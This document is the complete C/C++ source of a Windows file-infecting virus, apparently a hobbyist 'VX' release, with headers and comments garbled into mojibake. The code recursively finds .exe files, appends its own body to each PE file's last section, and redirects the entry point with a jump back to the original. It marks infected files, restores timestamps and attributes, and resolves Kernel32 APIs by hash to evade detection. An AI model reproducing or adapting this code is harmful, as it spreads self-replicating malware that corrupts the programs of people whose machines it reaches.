/**********************************************************************************************
*																							  *
*																							  *
*                                                                                             *  
*              ############                          ############         ############        *                                    
*             ##############                        ##############       ##############       *                            
*            ##            ##                      ##            ##     ##            ##      *            
*            ##            ##                      ##            ##     ##            ##      *         
*            ##            ##                      ##            ##     ##            ##      *          
*            ##            ##                      ##            ##     ##          ###       *         
*            ##            ##     ##        ##     ##            ##               ###         *                 
*            ##            ##      ##      ##      ##            ##             ###           *           
*            ##            ##       ##    ##       ##            ##           ###             *               
*            ##            ##        ##  ##        ##            ##         ###               *          
*            ##            ##         ####         ##            ##       ###                 *       
*            ##            ##         ####         ##            ##      ##                   *      
*            ##            ##        ##  ##        ##            ##      ##                   *      
*            ##            ##       ##    ##       ##            ##      ##                   *
*			  ##############       ##      ##       ##############       ###############      *                                          
*              ############       ##        ##       ############        ###############      *                                      
*                                                                                             *  
*                                                                                             *   
*																							  *
***********************************************************************************************
*																							  *
*									### #####                                                 *
*									### ######                                                *   
*										##   ##                                               *  
*										##   ##												  *
*									###	######                                                *
*									### #####                                                 *   
*																							  * 
***********************************************************************************************                                                                              
*																							  *
*									����� 0x02												  *
*																							  *
*									   ����:												  *
*																							  *
*(+) ����� ������ Kernel32 ����� SEH														  *
*(+) �������� ��-������ (*.exe)																  *
*(+) �� ���������� ����� ��������� ����������� ������										  *
*(+) �� ���������� �������� ������															  *
*(+) �������������
*(+) �������� �������� (����� ������� � ������������ �����:)								  *						  
*																							  *
*(-) ������������ ����� �����																  *
*(-) ���������� ������ �����																  *
*(-) �� ������������� (�.�. �������� ����� ��� �������� ������ �� �/�++)					  *
*																							  *
*(�) ������ �������� �� �� Windows XP SP2, �� ������ �� ������.								  *
*																							  *
*									������ 2.0												  *
*																							  *
***********************************************************************************************
*																							  *
*																							  *
*																							  *
***********************************************************************************************
*																							  *
*									����������:												  *
*																							  *
*1) ������ ������ ���������� � �������� ����� + �� ��������� ����.							  *
*2) ������ ����� �������� ����� ������� ���������� ��������� ������.						  *
*3) ����� ������ � ����� ������������ � �����������.										  *
*4) �������� ����� �������������� ��� ������ ��� ��������� ���������������� ����.			  *
*5) ������� ��� ������ �������� �� ����� �������� ������ (�/�++).							  *
*6) 1 ����� - ������ ������, 2 ����� - �������� ��������									  *
*																							  *
***********************************************************************************************
*																							  *
*										...													  *
*																							  *
* ����� ������ �����-����� ���������� ����� �� ��� (��������� �� �), ��� ������				  *
* ��������������� (���� ����). ����������� ��� ��������� �������:							  *
*	(+) �������� startup-���� � rtl (run-time library). ��� ����� �� ����������				  *
*			������� ����������� ��������� � ��������� � �������� ������� ������� ����		  *
*			(������ ���������� �� startup: #pragma comment(linker,"/ENTRY:Start") + ������,	  *
*			��� �������� ������� Start());													  *
*	(+) ������� ������� �������, �� ���� ��� ������ ������� ���� ���� (��� �����, �����		  *
*			������� �������� ������ ����������, etc);										  *
*	(+) ������� ���������� ����������, �� ���� ��� ����, ����� ���������� �� � �������		  *
*			������ � ������ �� �������� RWE. � �������� � ������ ����������� ���� �����		  *
*			������-��������. ��������� �� ���������� - ��������� � �����, ������� � ����	  *
*			������� �����.																	  *
*	(+) ������ (char*) - ���� ����� ��������� � �����, ���� ���� ����������� ���������. �	  *
*			������ ������ ��������� ��� (������): char szStr[]={'V','X',0};					  *
*			�� ������ �� ������ ����������� ������-��������. � ����������� ������:			  *
*			char szStr[]="VX";																  *	
*	(+) �� ����������� � ����� �������� ���������� ����������.								  *
*																							  *
* ��������� ���� � ���� ������� � ���������. ������, ��� �� ��� ������� ����� � ���������	  *
* ���������. ��, ��� �� ������, ��� ���� ������:)											  *
*																							  *
**********************************************************************************************/
//VC++ 6 (Compiler cl.exe)


																					//m1x
																			   //pr0mix@mail.ru


#include <windows.h>


//������ ��������� ������� Start()
#pragma comment(linker,"/ENTRY:Start")

//������ ���, ����� � ��� ���� ������ ���� ������ - �������(.text)
#pragma comment(linker,"/MERGE:.rdata=.data /MERGE:.data=.text")

//������ �� ��������: ������/������/����������
#pragma comment(linker,"/SECTION:.text,RWE")

//������� RVA � VA
#define RVATOVA(Base,Rva) ((DWORD)Base + (DWORD)Rva)

//������������
#define ALIGN_UP(x,y) ((x+(y-1))&(~(y-1)))

//������ ������ �������
#define VirusSize ((DWORD)fnEnd - (DWORD)Start)


//����� ���� ��������� ����������� �������
fnEnd();
int fnstrlen(char *pStr);
char* fnstrcpy(char *pStr1,char *pStr2);
char *fnstrcat(char *pStr1,char *pStr2);
int fnstrcmp(char *pStr1,char *pStr2);

template<DWORD Base,DWORD dwHash,class A>
inline LPVOID pusharg(A a);

template<DWORD Base,DWORD dwHash,class A>
inline LPVOID pusharg2(A a);

template<DWORD Base,DWORD dwHash,class A>
inline LPVOID pusharg3(A a);

template<DWORD Base,DWORD dwHash,class A>
inline LPVOID pusharg2(A a);

template<DWORD Base,DWORD dwHash,class A,class B>
inline LPVOID pusharg(A a,B b);

template<DWORD Base,DWORD dwHash,class A,class B,class C>
inline LPVOID pusharg(A a,B b,C c);

template<DWORD Base,DWORD dwHash,class A,class B,class C,class D>
inline LPVOID pusharg(A a,B b,C c,D d);

template<DWORD Base,DWORD dwHash,class A,class B,class C,class D,class E>
inline LPVOID pusharg(A a,B b,C c,D d,E e);

template<DWORD Base,DWORD dwHash,class A,class B,class C,class D,class E,class F>
inline LPVOID pusharg(A a,B b,C c,D d,E e,F f);

template<DWORD Base,DWORD dwHash,class A,class B,class C,class D,class E,class F,class G>
inline LPVOID pusharg(A a,B b,C c,D d,E e,F f,G g);

template<DWORD Base,DWORD dwHash,class A,class B,class C,class D,class E,class F,class G,class H>
inline LPVOID pusharg(A a,B b,C c,D d,E e,F f,G g,H h);

int IsInfect(unsigned char* pExe);
void FindExe(char *szDir,char *szMask);
int ValidPE(unsigned char *pExe);
int InfectFiles(char *szPath,WIN32_FIND_DATA* wfd);
DWORD GetKernelSEH();
DWORD CalcHash(char *pNameFunc);
LPVOID GetGetProcAddress(DWORD Base,DWORD dwHashName);
DWORD WINAPI ThreadFunc1(PVOID pv);//WINAPI==__stdcall
DWORD WINAPI ThreadFunc2(PVOID pv);
DeltaOffset();


// ��� ��������:)
#define	_fCreateFileA					pusharg<1,0x860b38bc>
#define	_fCreateFileMappingA			pusharg<1,0x1F394C74>
#define	_fMapViewOfFile					pusharg<1,0xFC6FB9EA>
#define	_fUnmapViewOfFile				pusharg2<1,0xCA036058>
#define	_fCloseHandle					pusharg3<1,0xF867A91E>
#define	_fFindFirstFileA				pusharg<1,0x3165E506>
#define	_fFindNextFileA					pusharg<1,0xCA920AD8>
#define	_fSetFileAttributesA			pusharg<1,0x152DC5D4>
#define	_fGetCurrentDirectoryA			pusharg<1,0x2F597DD6>
#define	_fLoadLibraryA					pusharg<1,0x71E40722>
#define	_fGetProcAddress				pusharg<1,0x5D7574B6>
#define	_fSetFileTime					pusharg<1,0xa2d2cb0c>
#define	_fVirtualProtect				pusharg<1,0x15f8ef80>
#define	_fExitProcess					pusharg<1,0xD66358EC>
#define _fGetFullPathNameA				pusharg<1,0x5dbc5670>
#define _fSetFilePointer				pusharg<1,0x7f3545c6>
#define _fSetEndOfFile					pusharg<1,0x059c5e24>
#define _fGetSystemTime					pusharg<1,0x8C8E727E>
#define _fCreateThread					pusharg<1,0x15B87EA2>
#define _fWaitForMultipleObjects		pusharg<1,0x0DD40E20>

#define _fMessageBoxA					pusharg<2,0xBE7B3098>


//���������� ������
char szStr[MAX_PATH];


/**********************************************************************************************
*																							  *
*	������� Start																			  *
*	���� ������� �������:)																	  *
*	������ ���������� ����																	  *
*	��� ������� ������ ���� ���������� ������ (��� � ������ ������). ���� �� ����� ���		  *
*	����������� ������ �������, ����� � ����� ������ ���� ��������������� � EntryPoint ������ *
*	���, ����� ������ ��������� ���� �������� ������ �� Start (������ ������ ��������, �	  *
*	��������, ������:)!																		  *
*																							  *
**********************************************************************************************/
void Start()
{

	DWORD ThID;
	HANDLE mThread[2];
	DWORD Delta=DeltaOffset();
	typedef DWORD (WINAPI *func)(PVOID);
	func pThread1=(func)((DWORD)ThreadFunc1+Delta);
	func pThread2=(func)((DWORD)ThreadFunc2+Delta);
	mThread[0]=_fCreateThread(0,0,pThread1,0,0,&ThID);
	mThread[1]=_fCreateThread(0,0,pThread2,0,0,&ThID);
	_fWaitForMultipleObjects(2,mThread,1,INFINITE);

	//� ������ ��������� ��� ������� ������ ������ ���������� ����� � Start, � ��� 
	//����������� - �������� ���������� �� OEP ������.
	fnEnd();	
}
/**********************************************************************************************
*																							  *
*	����� ������� Start																		  *
*																							  *
**********************************************************************************************/





/**********************************************************************************************
*																							  *
*	������� ThreadFunc1																		  *
*	������ ������																			  *
*	����:																					  *
*	pv - ��� ������																			  *
*	�����:																					  *
*	������ 0																				  *
*																							  *
**********************************************************************************************/
DWORD WINAPI ThreadFunc1(PVOID pv)
{
	char szPath[MAX_PATH];
	char szMask[]={'\\','*','.','*',0};
	_fGetCurrentDirectoryA(MAX_PATH,szPath);	
	FindExe(szPath,szMask);
	return 0;
}
/**********************************************************************************************
*																							  *
*	����� ������� ThreadFunc1																  *
*																							  *
**********************************************************************************************/






/**********************************************************************************************
*																							  *
*	������� ThreadFunc2																		  *
*	�������� ��������																		  *
*	����:																					  *
*	pv - ��� ������																			  *
*	�����:																					  *
*	������ 0																				  *
*																							  *
**********************************************************************************************/
DWORD WINAPI ThreadFunc2(PVOID pv)
{
	SYSTEMTIME st;
	char szMsg[]={'0','x','0','2',' ','b','y',' ','m','1','x',0};

	//������ ����, ��� �������� � ����������� �����������
	char *pStr=(char*)((DWORD)szStr+DeltaOffset());
	pStr[0]='V';
	pStr[1]='X';
	pStr[2]='!';
	pStr[3]='\0';	
	
	_fGetSystemTime(&st);
	if(st.wMinute%2)
	_fMessageBoxA(0,szMsg,pStr,0);
	return 0;
}
/**********************************************************************************************
*																							  *
*	����� ������� ThreadFunc2																  *
*																							  *
**********************************************************************************************/



/**********************************************************************************************
*																							  *
*	������� DeltaOffset																		  *
*	���������� ������-��������																  *
*	�����:																					  *
*	���������� ������-�������� (���)														  *
*																							  *
**********************************************************************************************/
DeltaOffset()
{
	__asm
	{
		call	_delta_
_delta_:
		pop		eax
		sub		eax,offset _delta_
	}
}
/**********************************************************************************************
*																							  *
*	����� ������� DeltaOffset																  *
*																							  *
**********************************************************************************************/




/**********************************************************************************************
*																							  *
*	������� fnstrlen																		  *
*	������� �������� � ������																  *
*	����:																					  *
*	pStr - ��������� �� ������																  *
*	�����:																					  *
*	������� ���������� ���������� �������� � ������											  *
*																							  *
**********************************************************************************************/
int fnstrlen(char *pStr)
{
	int len=0;
	while(*pStr++)
		len++;
	return len;
}
/**********************************************************************************************
*																							  *
*	����� ������� fnstrlen																	  *
*																							  *
**********************************************************************************************/




/**********************************************************************************************
*																							  *
*	������� fnstrcpy																		  *
*	����������� ����� ������ � ������														  *
*	����:																					  *
*	pStr1 - ��������� �� ������ ��������													  *
*	pStr2 - ��������� �� ������ ��������													  *
*	�����:																					  *
*	pStr1 - ������� ������																	  *
*	������� ���������� �� ��������� �� ������ ��������										  *
*																							  *
**********************************************************************************************/
char* fnstrcpy(char *pStr1,char *pStr2)
{
	char *pTmp=pStr1;
	while(*pStr1++=*pStr2++)		
	*pStr1='\0';
	return pTmp;
}
/**********************************************************************************************
*																							  *
*	����� ������� fnstrcpy
*																							  *
**********************************************************************************************/





/**********************************************************************************************
*																							  *
*	������� fnstrcat																		  *
*	������������ �����																		  *
*	����:																					  *
*	pStr1 - ��������� �� ������ ��������													  *
*	pStr2 - ��������� �� ������ ��������													  *
*	�����:																					  *
*	pStr1 - ������� ������																	  *
*	������� ���������� �� ��������� �� ������ ��������										  *
*																							  *
**********************************************************************************************/
char *fnstrcat(char *pStr1,char *pStr2)
{
	char *pTmp=pStr1;
	while(*pStr1++);
//	pStr1--;
	fnstrcpy(--pStr1,pStr2);
	return pTmp;
}
/**********************************************************************************************
*																							  *
*	����� ������� fnstrcat																	  *
*																							  *
**********************************************************************************************/





/**********************************************************************************************
*																							  *
*	������� fnstrcmp																		  *
*	��������� �����																			  *
*	����:																					  *
*	pStr1 - ��������� �� ������ ��������													  *
*	pStr2 - ��������� �� ������ ��������												      *
*	�����:																					  *
*	pStr1 - ������� ������																	  *
*	������� ���������� �� ��������� �� ������ ��������										  *
*																							  *
**********************************************************************************************/
int fnstrcmp(char *pStr1,char *pStr2)
{
//	int len1=fnstrlen(pStr1);
	int len2=fnstrlen(pStr2);
	while(*pStr1)
	{
		if(*pStr1++==*pStr2++)
		len2--;
	}
	return len2;
}
/**********************************************************************************************
*																							  *
*	����� ������� fnstrcmp																	  *
*																							  *
**********************************************************************************************/





/**********************************************************************************************
*																							  *
*	������������� ������� pusharg
*	������� ������ ������ � ������ ������ ������											  *
*	����:																					  *
*	Base - ����� ����(1 - Kernel32, 2 - User32, default - return 0)							  *
*	dwHash - ��� �� ����� �������															  *
*	class x - ��������� ������� ��������� �������											  *
*																							  *
**********************************************************************************************/
template<DWORD Base,DWORD dwHash,class A>
inline LPVOID pusharg(A a)
{
	typedef LPVOID(__stdcall* func)(A);
	func fnFunc=(func)GetGetProcAddress(Base,dwHash);
	return fnFunc(a);
}

template<DWORD Base,DWORD dwHash,class A>
inline LPVOID pusharg2(A a)
{
	typedef LPVOID(__stdcall* func)(A);
	func fnFunc=(func)GetGetProcAddress(Base,dwHash);
	return fnFunc(a);
}

template<DWORD Base,DWORD dwHash,class A>
inline LPVOID pusharg3(A a)
{
	typedef LPVOID(__stdcall* func)(A);
	func fnFunc=(func)GetGetProcAddress(Base,dwHash);
	return fnFunc(a);
}

template<DWORD Base,DWORD dwHash,class A,class B>
inline LPVOID pusharg(A a,B b)
{
	typedef LPVOID(__stdcall* func)(A,B);
	func fnFunc=(func)GetGetProcAddress(Base,dwHash);
	return fnFunc(a,b);
}

template<DWORD Base,DWORD dwHash,class A,class B,class C>
inline LPVOID pusharg(A a,B b,C c)
{
	typedef LPVOID(__stdcall* func)(A,B,C);
	func fnFunc=(func)GetGetProcAddress(Base,dwHash);
	return fnFunc(a,b,c);
}

template<DWORD Base,DWORD dwHash,class A,class B,class C,class D>
inline LPVOID pusharg(A a,B b,C c,D d)
{
	typedef LPVOID(__stdcall* func)(A,B,C,D);
	func fnFunc=(func)GetGetProcAddress(Base,dwHash);
	return fnFunc(a,b,c,d);
}

template<DWORD Base,DWORD dwHash,class A,class B,class C,class D,class E>
inline LPVOID pusharg(A a,B b,C c,D d,E e)
{
	typedef LPVOID(__stdcall* func)(A,B,C,D,E);
	func fnFunc=(func)GetGetProcAddress(Base,dwHash);
	return fnFunc(a,b,c,d,e);
}

template<DWORD Base,DWORD dwHash,class A,class B,class C,class D,class E,class F>
inline LPVOID pusharg(A a,B b,C c,D d,E e,F f)
{
	typedef LPVOID(__stdcall* func)(A,B,C,D,E,F);
	func fnFunc=(func)GetGetProcAddress(Base,dwHash);
	return fnFunc(a,b,c,d,e,f);
}

template<DWORD Base,DWORD dwHash,class A,class B,class C,class D,class E,class F,class G>
inline LPVOID pusharg(A a,B b,C c,D d,E e,F f,G g)
{
	typedef LPVOID(__stdcall* func)(A,B,C,D,E,F,G);
	func fnFunc=(func)GetGetProcAddress(Base,dwHash);
	return fnFunc(a,b,c,d,e,f,g);
}

template<DWORD Base,DWORD dwHash,class A,class B,class C,class D,class E,class F,class G,class H>
inline LPVOID pusharg(A a,B b,C c,D d,E e,F f,G g,H h)
{
	typedef LPVOID(__stdcall* func)(A,B,C,D,E,F,G,H);
	func fnFunc=(func)GetGetProcAddress(Base,dwHash);
	return fnFunc(a,b,c,d,e,f,g,h);
}
/**********************************************************************************************
*																							  *
*	����� ������� pusharg																	  *
*																							  *
**********************************************************************************************/





/**********************************************************************************************
*																							  *
*	������� InfectFiles																		  *
*	������ PE-������ ������� ���������� ��������� ������									  *
*	����:																					  *
*	szPath - ���� � ����� - ������:)!														  *
*	wfd - ��������� �� ���������															  *
*	�����:																					  *
*	������� ���������� 1, ���� ��� �����, ����� 0.											  *
*																							  *
**********************************************************************************************/
int InfectFiles(char *szPath,WIN32_FIND_DATA* wfd)
{
	//���������� ��������������� ����������
	//����� ����� ���������:
	DWORD VirtualSize;								//����������� ������ ��������� ������
	DWORD Overlay;									//������ ������� (���� ����)
	DWORD WriteTo,WriteFrom;						//������, ����/������ ����������
	DWORD NewEP;									//����� ����� ����� ������
	DWORD OEP;										//original entry point
	LPVOID pExe;									//���� ��������
	IMAGE_DOS_HEADER *imDh;							//��-���������
	IMAGE_NT_HEADERS *imNTh;						//��-���������
	IMAGE_SECTION_HEADER *imSh;						//���������� ���������
	IMAGE_SECTION_HEADER *pLastSection;				//��������� �� ��������� ������
	HANDLE hFileMap;								//����� ��������� �����
	DWORD NewSize;									//����� ����������� ������
	DWORD i;										//�������
	unsigned char RetCode[]=						//� ������� ���� ������� ������ ������� �� ������ (mov eax,OEP	jmp eax)
	{
		0xb8,0xff,0xe0
	};

	//������ ������ �������� (�� ������, ���� ����� ReadOnly)
	_fSetFileAttributesA(szPath,FILE_ATTRIBUTE_NORMAL);
	
/**********************************************************************************************
								BEG   ��������� ���� ��������
**********************************************************************************************/

	//��������� ���� �� ������/������
	HANDLE hFile=(HANDLE)_fCreateFileA(szPath,GENERIC_READ | GENERIC_WRITE,
							FILE_SHARE_READ | FILE_SHARE_WRITE,NULL,
							OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	
	//���� ��������, ���������
	if(hFile==INVALID_HANDLE_VALUE) goto _error2_;

	//����� ������ � ������ ������������. ������ FileAlignment=0x1000 (�.�. � �������)
	NewSize=ALIGN_UP(VirusSize+7,0x1000);
	NewSize+=wfd->nFileSizeLow;

	//������� �������� ����� � ������ ������ �������
	hFileMap=(HANDLE)_fCreateFileMappingA(hFile,0,PAGE_READWRITE,0,NewSize,0);
	if(!hFileMap)
	{
		_fCloseHandle(hFile);
		goto _error2_;
	}

	//�������� ���� ��������
	pExe=(LPVOID)_fMapViewOfFile(hFileMap,FILE_MAP_ALL_ACCESS,0,0,0);
	_fCloseHandle(hFile);
	_fCloseHandle(hFileMap);
	if(!pExe)
	{
		goto _error1_;
	}
/**********************************************************************************************
								END   ��������� ���� ��������
**********************************************************************************************/

	//��� ��-����?
	if(!ValidPE((unsigned char *)pExe))
		goto _error1_;

	//������� ����?
	if(IsInfect((unsigned char *)pExe))
		goto _error1_;

/**********************************************************************************************
								BEG ������ ����������
**********************************************************************************************/
	imDh=(IMAGE_DOS_HEADER*)pExe;
	imNTh=(IMAGE_NT_HEADERS*)((DWORD)pExe+imDh->e_lfanew);
	imSh=(IMAGE_SECTION_HEADER*)((DWORD)imNTh+sizeof(IMAGE_NT_HEADERS));
	pLastSection=imSh;

	//���� ��������� ������ ���������� � ���������
	for(i=0;i<imNTh->FileHeader.NumberOfSections;i++)
	{
		if((pLastSection->PointerToRawData<imSh->PointerToRawData) &&
		   (pLastSection->VirtualAddress<imSh->VirtualAddress))
			pLastSection=imSh;
		imSh++;
	}
/**********************************************************************************************
								END ������ ����������
**********************************************************************************************/	

	//���������� ������ ��������� ������==0?
	if(!pLastSection->SizeOfRawData) goto _error1_;

	//��� ������ �������� ������������������ ������?
	if(pLastSection->SizeOfRawData<pLastSection->Misc.VirtualSize) goto _error1_;

	//������� ��� ������ ����� ������ �����
	NewSize=ALIGN_UP(VirusSize+7,imNTh->OptionalHeader.FileAlignment);
	NewSize+=wfd->nFileSizeLow;
	Overlay=ALIGN_UP(pLastSection->SizeOfRawData+pLastSection->PointerToRawData,
		imNTh->OptionalHeader.FileAlignment);

	//���� �� �������?
	if(Overlay<wfd->nFileSizeLow)
	{
		Overlay=wfd->nFileSizeLow-Overlay;
		WriteTo=(DWORD)pExe+NewSize-1;
		WriteFrom=(DWORD)pExe+wfd->nFileSizeLow-1;

		//���������� � �����
		for(unsigned int i=0;i<Overlay;i++)
		{
			*(BYTE*)(WriteTo-i)=*(BYTE*)(WriteFrom-i);
		}
	}

/**********************************************************************************************
								BEG ��������� ����
**********************************************************************************************/
	//������� � ��������� ����� ����� �� �����
	WriteTo=(DWORD)pExe+pLastSection->PointerToRawData+pLastSection->SizeOfRawData;

	//������� ����� ����� �����
	NewEP=pLastSection->VirtualAddress+pLastSection->SizeOfRawData;

	//������ ����� �������� ���� ��� (� ������ ������)
	WriteFrom=(DWORD)Start+DeltaOffset();

	//��������:)!
	memcpy((PVOID)WriteTo,(PVOID)WriteFrom,VirusSize);

	//������������ �����
	WriteTo+=VirusSize;

	//������ � ������ ���������� ������� �� �� OEP
	memcpy((PVOID)WriteTo,&RetCode[0],1);
	WriteTo++;
	OEP=imNTh->OptionalHeader.ImageBase+imNTh->OptionalHeader.AddressOfEntryPoint;
	memcpy((PVOID)WriteTo,&OEP,4);
	WriteTo+=4;
	memcpy((PVOID)WriteTo,&RetCode[1],2);
/**********************************************************************************************
								END ��������� ����
**********************************************************************************************/

/**********************************************************************************************
								BEG ��������� ����� ������
**********************************************************************************************/
	
	//������������

	//����������� � ����������� ���������� ������ ��������� ������
	pLastSection->SizeOfRawData=ALIGN_UP(pLastSection->SizeOfRawData+VirusSize+7,
		imNTh->OptionalHeader.FileAlignment);

	//����������� ������
	VirtualSize=pLastSection->Misc.VirtualSize+VirusSize+7;
	if(pLastSection->SizeOfRawData<VirtualSize)
		pLastSection->Misc.VirtualSize=VirtualSize;
	else
		pLastSection->Misc.VirtualSize=pLastSection->SizeOfRawData;

	//����� �����
	imNTh->OptionalHeader.AddressOfEntryPoint=NewEP;

	//������ ������
	imNTh->OptionalHeader.SizeOfImage=ALIGN_UP(pLastSection->Misc.VirtualSize+
		pLastSection->VirtualAddress,imNTh->OptionalHeader.SectionAlignment);

	//�������������� ������
	pLastSection->Characteristics=0xa0000020;

	//������ ����� ���������
	*(WORD*)((DWORD)pExe+0x34)=0x3031;

	//
	wfd->nFileSizeLow=NewSize;

/**********************************************************************************************
								END ��������� ����� ������
**********************************************************************************************/
	
_error1_:

	//���� �� ��������� �����, �� ������������ ��������� ����� ������
	NewSize=wfd->nFileSizeLow;

	//���������
	_fUnmapViewOfFile(pExe);

_error2_:

/**********************************************************************************************
								BEG ��������������
**********************************************************************************************/	
	hFile=(HANDLE)_fCreateFileA(szPath,GENERIC_READ | GENERIC_WRITE,
							FILE_SHARE_READ | FILE_SHARE_WRITE,NULL,
							OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	if(hFile!=INVALID_HANDLE_VALUE)
	{
	//������� ��������� �����������
	_fSetFileTime(hFile,&wfd->ftCreationTime,&wfd->ftLastAccessTime,&wfd->ftLastWriteTime);		

	//��������� ������� �����
	_fSetFilePointer(hFile,NewSize,0,FILE_BEGIN);
	_fSetEndOfFile(hFile);	
	}
//	else return 0;
	
	//��������� �����
	_fSetFileAttributesA(szPath,wfd->dwFileAttributes);
	return 1;
/**********************************************************************************************
								END ��������������
**********************************************************************************************/
}
/**********************************************************************************************
*																							  *
*	����� ������� InfectFiles
*																							  *
**********************************************************************************************/





/**********************************************************************************************
*																							  *
*	������� FindExe																			  *
*	����� (� ������) ������� � ����� + �� ��������� ������									  *
*	����:																					  *
*	szDir - ���� (������: "C:\\Games\\01")													  *
*	szMasm - ����� ������ (������: "\\*.*")													  *
*																							  *
**********************************************************************************************/
void FindExe(char *szDir,char *szMask)
{
	char szBuf[MAX_PATH];
	int flag=1;
	LPTSTR part;
	WIN32_FIND_DATA wfd;
	
	fnstrcpy(szBuf,szDir);
	fnstrcat(szBuf,szMask);
	_fGetFullPathNameA(szBuf,MAX_PATH,szBuf,&part);

	//�������� �����
	HANDLE hFindFile=(HANDLE)_fFindFirstFileA(szBuf,&wfd);
	if(hFindFile!=INVALID_HANDLE_VALUE)
	{
		while(flag)
		{
			//�� ����� �����
			if((wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && (wfd.cFileName[0]!='.'))
			{
				//��������� � ���
				fnstrcpy(part,wfd.cFileName);//����� �������, ����� �� ���������:)!
				FindExe(szBuf,szMask);
			}
			else
			{
				//����� �� ����� ����
				char *pStr=&wfd.cFileName[fnstrlen(wfd.cFileName)-4];
				char szExe[]={'.','e','x','e',0};
				//��� �������?
				if(fnstrcmp(pStr,szExe)==0)
				{
					//����� ��������
					fnstrcpy(part,wfd.cFileName);
					InfectFiles(szBuf,&wfd);
				}
			}
			//���� ������
			flag=(int)_fFindNextFileA(hFindFile,&wfd);			
		}
	}
}
/**********************************************************************************************
*																							  *
*	����� ������� FindExe																	  *
*																							  *
**********************************************************************************************/





/**********************************************************************************************
*																							  *
*	������� ValidPE																			  *
*	��� ��-����?																			  *
*	����:																					  *
*	pExe - ���� (������)																	  *
*	�����:																					  *
*	������� ���������� 1 - ���� ��, ����� 0													  *
*																							  *
**********************************************************************************************/
int ValidPE(unsigned char *pExe)
{
	IMAGE_DOS_HEADER *imDh=(IMAGE_DOS_HEADER*)pExe;
	if(imDh->e_magic=='ZM')
	{
		IMAGE_NT_HEADERS *imNTh=(IMAGE_NT_HEADERS*)((int)imDh+imDh->e_lfanew);
		if(imNTh->Signature=='EP')
			return 1;
		else return 0;
	}
	return 0;
}
/**********************************************************************************************
*																							  *
*	����� ������� ValidPE																	  *
*																							  *
**********************************************************************************************/





/**********************************************************************************************
*																							  *
*	������� IsInfect																		  *
*	�������� �� ������������ ��-�����														  *
*	����:																					  *
*	pExe - ���� (������)																	  *
*	�����:																					  *
*	������� ���������� 1 - ���� ���� �������, ����� 0										  *
*																							  *
**********************************************************************************************/
int IsInfect(unsigned char* pExe)
{
	if(*(WORD*)((DWORD)pExe+0x34)==0x3031)
		return 1;
	else return 0;
}
/**********************************************************************************************
*																							  *
*	����� ������� IsInfect																	  *
*																							  *
**********************************************************************************************/






/**********************************************************************************************
*																							  *
*	������� GetKernelSEH																	  *
*	����� ���� Kernel32 ����� SEH															  *
*																							  *
**********************************************************************************************/
DWORD GetKernelSEH()
{
	DWORD *pAddr;
	DWORD i=0;

	//����� TEB
	__asm
	{
		xor		edx,edx
		mov		eax,dword ptr fs:[edx]
		mov		pAddr,eax
	}

	//����� ��������� �����������
	while(*pAddr!=-1)
		pAddr=(DWORD*)*pAddr;
	pAddr=(DWORD*)(*(++pAddr));

	//����������� � ������ �������������� ��������� ������
	pAddr=(DWORD*)((DWORD)pAddr & 0xffff0000);
	IMAGE_DOS_HEADER *imDh=(IMAGE_DOS_HEADER*)pAddr;	

	//���������� ������� (5)
	for(;i<5;i++)
	{	

		//����� ���� ������32
		if(ValidPE((unsigned char*)imDh))
			break;

		//� ������ �������������
		imDh=(IMAGE_DOS_HEADER*)((DWORD)imDh-0x10000);
	}
	return (DWORD)imDh;
}
/**********************************************************************************************
*																							  *
*	����� ������� GetKernelSEH
*																							  *
**********************************************************************************************/





/**********************************************************************************************
*																							  *
*	������� CalcHash																		  *
*	������� ���� �� ����� �������															  *
*	����:																					  *
*	pNameFunc - ����� ������ (����� �������)												  *
*	�����:																					  *
*	������� ���������� ���																	  *
*																							  *
**********************************************************************************************/
DWORD CalcHash(char *pNameFunc)
{
	DWORD hash=0,tmp=0;
	while(*pNameFunc)
	{
		tmp=((tmp & 0xFFFFFF00) | *pNameFunc);
		tmp=(tmp>>7) | (tmp<<(32-7));
		hash^=tmp;
		pNameFunc++;
	}
	return hash;
}
/**********************************************************************************************
*																							  *
*	����� ������� CalcHash																	  *
*																							  *
**********************************************************************************************/






/**********************************************************************************************
*																							  *
*	������� GetGetProcAddress																  *
*	����� ������ ������ ���-�������															  *
*	����:																					  *
*	Base - ����� ����(1 - Kernel32, 2 - User32)												  *
*	dwHashName - ��� �� ����� �������														  *
*	�����:																					  *
*	������� ���������� ����� ������ ������													  *
*																							  *
**********************************************************************************************/
LPVOID GetGetProcAddress(DWORD Base,DWORD dwHashName)
{
	HMODULE hModule;

	//������ � �����!!!!!!!
	char szUser32[]={'u','s','e','r','3','2',0};
	switch(Base)
	{
	case 1:
		//���� �������32
		hModule=(HMODULE)GetKernelSEH();
		break;
	case 2:
		//����������� ������ ����������
		hModule=(HMODULE)_fLoadLibraryA(szUser32);
		break;
	default: return 0;
	}

/**********************************************************************************************
								BEG ������ ������� �������� � ������32
**********************************************************************************************/	
	DWORD i=0;
	IMAGE_DOS_HEADER *imDh=(IMAGE_DOS_HEADER*)hModule;
	IMAGE_OPTIONAL_HEADER *imOh=(IMAGE_OPTIONAL_HEADER*)((DWORD)hModule+imDh->e_lfanew+4+
		sizeof(IMAGE_FILE_HEADER));
	IMAGE_EXPORT_DIRECTORY *imEd=(IMAGE_EXPORT_DIRECTORY*)RVATOVA(hModule,
		imOh->DataDirectory[0].VirtualAddress);
	DWORD *pAddrOfNames=(DWORD*)RVATOVA(hModule,imEd->AddressOfNames);
	WORD  *pAddrOfNameOrdinals=(WORD*)RVATOVA(hModule,imEd->AddressOfNameOrdinals);
	DWORD ordinal=0;
	if (HIWORD((DWORD)dwHashName) == 0)
	{		
		ordinal=(LOWORD((DWORD)dwHashName))-imEd->Base;
	}
	else
	{
		for(;i<imEd->NumberOfNames;i++,pAddrOfNames++,pAddrOfNameOrdinals++)
		{
			//���������� �� �����
			if(CalcHash((char*)RVATOVA(hModule,*pAddrOfNames))==dwHashName)
			{
				ordinal=*pAddrOfNameOrdinals;
				break;
			}
		}
	}
	DWORD *pAddrOfFunc=(DWORD*)RVATOVA(hModule,imEd->AddressOfFunctions);
	DWORD ret=pAddrOfFunc[ordinal];
	return (LPVOID)RVATOVA(hModule,ret);
/**********************************************************************************************
								END ������ ������� �������� � ������32
**********************************************************************************************/
}
/**********************************************************************************************
*																							  *
*	����� ������� GetGetProcAddress															  *
*																							  *
**********************************************************************************************/



//���� ��� �������� ����� ������� ������� �� ������:
//mov	eax,OEP
//jmp	eax
fnEnd(){}
